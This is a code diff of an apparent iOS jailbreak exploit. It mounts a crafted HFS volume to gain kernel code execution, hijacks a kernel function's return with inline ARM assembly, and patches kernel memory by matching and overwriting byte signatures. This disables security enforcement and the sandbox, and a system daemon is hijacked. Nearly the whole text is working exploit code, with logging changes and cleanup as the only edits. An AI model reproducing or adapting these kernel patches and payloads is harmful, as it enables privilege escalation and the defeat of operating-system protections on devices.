@@ -19,7 +19,7 @@ void prepare_vndevice() {
 
 	int fd = open("/dev/vn0", O_RDONLY, 0);
 	if (fd < 0) {
-	    	printf("Can't openn /dev/vn0 special file.\n");
+	    	printf("Can't open /dev/vn0 special file.\n");
 		exit(1);
 	}
 
@@ -58,7 +58,7 @@ void dump(void *addr, unsigned int size) {
 	unsigned int *daddr = (unsigned int *) addr;
 	
 	for (i = 0; i < count; i+=4) {
-		kprintf("%08x %08x %08x %08x\n", daddr[i], daddr[i+1], daddr[i+2], daddr[i+3]);
+		IOLog("%08x %08x %08x %08x\n", daddr[i], daddr[i+1], daddr[i+2], daddr[i+3]);
 	}
 }
 
@@ -96,7 +96,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	unsigned int i = 0;
 	unsigned char *paddress = address - 2;
 	
-	kprintf("Entering patch_kernel()\n");
+	IOLog("Entering patch_kernel()\n");
 	
 	for(i = 0; i < size; i+=2) {
 		paddress+=2;
@@ -104,7 +104,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 1
 		if(mem16eq(paddress, "\x00\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00")) {
 			target = i + 0;
-			kprintf("Found kernel patch 1 at %p\n", &address[target]);
+			IOLog("Found kernel patch 1 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x01\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00", 16);
 			continue;
 		}
@@ -112,13 +112,13 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 2
 		if(mem8eq(paddress, "\x00\xB1\x00\x24\x20\x46\x90\xBD")) {
 			target = i + 0;
-			kprintf("Found armv7 kernel patch 2 at %p\n", &address[target]);
+			IOLog("Found armv7 kernel patch 2 at %p\n", &address[target]);
 			_memcpy((char*) &address[target], "\x00\xB1\x01\x24\x20\x46\x90\xBD", 8);
 			continue;
 		}
 		if(mem16eq(paddress, "\x00\x00\x50\xE3\x00\x00\x00\x0A\x00\x40\xA0\xE3\x04\x00\xA0\xE1")) {
 			target = i + 8;
-			kprintf("Found armv6 kernel patch 2 at %p\n", &address[target]);
+			IOLog("Found armv6 kernel patch 2 at %p\n", &address[target]);
 			_memcpy((char*) &address[target], "\x01\x40\xA0\xE3", 4);
 			continue;
 		}
@@ -126,7 +126,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 3
 		if(mem8eq(paddress, "\x00\x23\x00\x94\x01\x95\x02\x95")) {
 			target = i + 10;
-			kprintf("Found kernel patch 3 at %p\n", &address[target]);
+			IOLog("Found kernel patch 3 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20\x00\xD3\x80\x04\x98\x02\x21\x7C\x4B\x20", 4);
 			continue;
 		}
@@ -134,13 +134,13 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 4
 		if(mem8eq(paddress, "\x02\x90\x03\x90\x1D\x49\x50\x46")) {
 			target = i + 12;
-			kprintf("Found armv7 kernel patch 4 at %p\n", &address[target]);
+			IOLog("Found armv7 kernel patch 4 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
 		if(mem8eq(paddress, "\x02\x90\x03\x90\x06\x9A\x07\x9B")) {
 			target = i + 12;
-			kprintf("Found armv6 kernel patch 4 at %p\n", &address[target]);
+			IOLog("Found armv6 kernel patch 4 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
@@ -149,13 +149,13 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		if(mem8eq(paddress, "\xD3\x80\x04\x98\x02\x21\x7C\x4B")
 				|| mem8eq(paddress, "\x98\x47\x50\xB9\x00\x98\x02\x21")) {
 			target = i + 8;
-			kprintf("Found armv7 kernel patch 5 at %p\n", &address[target]);
+			IOLog("Found armv7 kernel patch 5 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20", 2);
 			continue;
 		}
 		if(mem8eq(paddress, "\x0D\xD1\x01\x98\x02\x21\x34\x4B")) {
 			target = i + 8;
-			kprintf("Found armv6 kernel patch 5 at %p\n", &address[target]);
+			IOLog("Found armv6 kernel patch 5 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20", 2);
 			continue;
 		}
@@ -164,7 +164,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		if(mem8eq(paddress, "\x00\x28\x40\xF0\xCC\x80\x04\x98")
 				|| mem8eq(paddress, "\x28\xB9\x00\x98\xFF\xF7\x03\xFF")) {
 			target = i + 8;
-			kprintf("Found kernel patch 6 at %p\n", &address[target]);
+			IOLog("Found kernel patch 6 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
@@ -172,7 +172,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 7
 		if(mem8eq(paddress, "\x1F\x4C\x1E\xE0\x28\x46\x51\x46")) {
 			target = i + 8;
-			kprintf("Found kernel patch 7 at %p\n", &address[target]);
+			IOLog("Found kernel patch 7 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x01\x20\x01\x20", 4);
 			continue;
 		}
@@ -180,7 +180,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		// Patch 8
 		if(mem8eq(paddress, "\xA0\x47\x08\xB1\x28\x46\x30\xE0")) {
 			target = i + 8;
-			kprintf("Found kernel patch 8 at %p\n", &address[target]);
+			IOLog("Found kernel patch 8 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x00\x20\x00\x20", 4);
 			continue;
 		}
@@ -189,7 +189,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 		if(mem8eq(paddress, "\x85\x68\x00\x23\x02\x93\x01\x93") ||
 				mem8eq(paddress, "\x85\x68\x00\x23\x04\x93\x03\x93")) {
 			target = i + 8;
-			kprintf("Found kernel patch 9 at %p\n", &address[target]);
+			IOLog("Found kernel patch 9 at %p\n", &address[target]);
 			_memcpy(&address[target], "\x0B\xE0\xC0\x46", 4);
 			continue;
 		}
@@ -198,24 +198,15 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	return 0;
 }
 
-int patch_sandbox(void* address, unsigned int size) {
-	kprintf("'bad opco' : %08x\n", memfind8(address, size, "bad opco"));	
-}
-
 static __attribute__ ((noinline)) void real_payload() {
 	patch_kernel((void*) 0x80000000, 0xA00000);
 	patch_sandbox((void*) 0x80000000, 0xA00000);
 }
 
-void payload() {
-	// push	{r7, lr}
-
+__attribute__ ((naked)) void payload() {
 	real_payload();
 
 	asm (
-		// the compiler adds a push before the code, reverting the effect:
-		"add     sp, sp, #0x8\n\t"
-
 		// hfs_MountHFSVolume epilog:
 		"mov	r0, #0x10\n\t"
 		"lsl	r0, #0x8\n\t"	// put a readable page address in r0
@@ -227,8 +218,6 @@ void payload() {
 		"mov     r11, r4\n\t"
 		"pop     {r4-r7,pc}"
 	);
-
-	// pop	{r7, pc}
 }
 
 int one = 1;
@@ -239,10 +228,8 @@ int main(int argc, char* argv[]) {
 	//we must do this as fast as possible (yes this sucks but it kinda works)
 	sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
 
-	printf("pod2g takes the stage ...");
 	prepare_vndevice();
 	mount_evil_hfs();
-	printf("and scores !");
  
 	//run the legit daemon we just hijacked
 	setenv("DYLD_INSERT_LIBRARIES", "", 1);
